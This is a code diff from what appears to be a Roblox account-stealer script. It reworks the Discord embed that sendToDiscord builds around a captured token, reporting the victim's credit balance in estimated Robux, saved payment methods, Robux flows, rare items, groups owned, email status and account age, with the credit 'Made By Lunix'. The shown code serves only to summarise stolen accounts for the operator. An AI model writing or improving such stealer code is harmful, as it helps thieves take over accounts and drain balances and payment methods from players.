@@ -1873,17 +1873,12 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<a:emoji_33:1410233678226788443> Credit Balance",
-            value: userData.creditBalance && userData.creditBalance > 0 
-              ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`
-              : "$0",
-            inline: true
+            name: "<a:emoji_33:1410233678226788443> Billing",
+            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "Yes" : "No"}`,
+            inline: false
+          
           },
-          {
-            name: "<a:emoji_33:1410233678226788443> Saved Payment",
-            value: userData.savedPayment ? "True" : "False",
-            inline: true
-          },
+          
           {
             name: "<:emoji_31:1410233610031857735> Robux In/Out",
             value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
@@ -1894,11 +1889,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
             inline: true
           },
-          {
-            name: " Age",
-            value: `${userData.accountAge || 0} Days`,
-            inline: true
-          },
+                    
           {
             name: " Groups Owned",
             value: userData.groupsOwned?.toString() || "0",
@@ -1915,15 +1906,11 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: false
           },
           {
-            name: "Email Verified",
-            value: userData.emailVerified ? "Yes" : "No",
-            inline: true
+            name: " Settings",
+            value: `Email Verified: ${userData.emailVerified ? "Yes" : "No"}\nVoice Chat: ${userData.voiceChatEnabled ? "Yes" : "No"}\nAccount Age: ${userData.accountAge || 0} Days`,
+            inline: false                  
           },
-          {
-            name: "Voice Chat Enabled",
-            value: userData.voiceChatEnabled ? "Yes" : "No",
-            inline: true
-          }
+          
         ],
         footer: {
           text: "Made By Lunix"
